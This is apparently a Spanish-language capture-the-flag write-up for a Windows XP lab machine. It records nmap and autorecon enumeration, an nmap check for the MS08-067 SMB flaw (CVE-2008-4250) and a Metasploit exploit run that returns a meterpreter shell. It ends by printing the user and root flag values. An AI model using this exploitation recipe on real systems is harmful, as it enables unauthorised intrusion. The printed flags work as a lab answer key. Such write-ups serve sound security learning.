
![[ 20250708095033.png]]

# Nmap

relizamos un escaneo basico de puertos con nmap

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.241.19 -oN scanner
```
![[ 20250708095741.png]]

Una vez identificados los puertos abiertos procedemos a lanzar scripts básicos para ver el servicio y la versión que corren por detras

```bash
nmap -p135,139.445 -sCV 10.129.241.19 -oN targeted
```

![[ 20250708095923.png]]

# Autorecon

Vamos a utilizar la herramienta autorecon a ver si conseguimos sacar algún dato extra que nos ayude a saber por donde debemos atacar

![[ 20250708100741.png]]

aqui podemos ver que la maquina utiliza un windows XP del 2000-2008 PocketPC/CE tratemos de buscar vulnerabilidades es este tipo de sistemas

comprobamos que los equipos con el S.O de nuestra victima son vulnerables a CVE-2008-4250 fue una vulnerabilidad muy tipica en la epoca por lo que vamos a comprobarlo

usando nmap podemos filtrar vulnerabilidades primero hay que ver si la vulnerabiliad se encuentra en el listado de nmap 

```bash
ls /usr/share/nmap/scripts/ | grep smb
```
![[ 20250708101928.png]]

podemos comprobar que si que esta la vulnerabilidad asi que usamos nmap para confirmarlo

```bash
nmap -p445 10.129.227.181 --script smb-vuln-ms08-067 -sV
```

![[ 20250708102045.png]]

vemos que nmap termina de confirmar nuestras sospechas

# metasploit

abrimos metasploit

```bash
msfdb run
```

buscamos exploits con la vulnerabilidad y vemos que si que existe uno 

```bash
search ms08-067
```

![[ 20250708102247.png]]

```bash
use 0
```

cambiamos el rhosts 

```bash
set rhosts <IP Victima>
```

```bash
exploit
```

![[ 20250708102611.png]]

vemos que el exploit es un exito y nos devuelve una shell como meterpreter

vemos que en el directorio `C:\Documents and Settings\Administrator\Desktop` se encuentra la flag de root

![[ 20250708102844.png]]

y la flag de user esta en el directorio `C:\Documents and Settings\john\Desktop `

![[ 20250708102935.png]]

# flags

user : e69af0e4f443de7e36876fda4ec7644f

root : 993442d258b0e0ec917cae9e695d5713